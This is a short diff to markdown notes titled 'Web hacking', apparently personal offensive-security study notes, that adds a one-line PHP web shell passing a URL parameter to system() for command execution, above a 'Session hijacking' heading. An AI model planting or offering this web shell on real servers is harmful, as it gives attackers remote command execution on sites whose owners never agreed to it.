@@ -1,6 +1,9 @@
 # Web hacking
 **Notes**
-
+```<?php
+    echo system($_GET["cmd"]);
+?>
+```
 
 ## Common
 **Session hijacking**
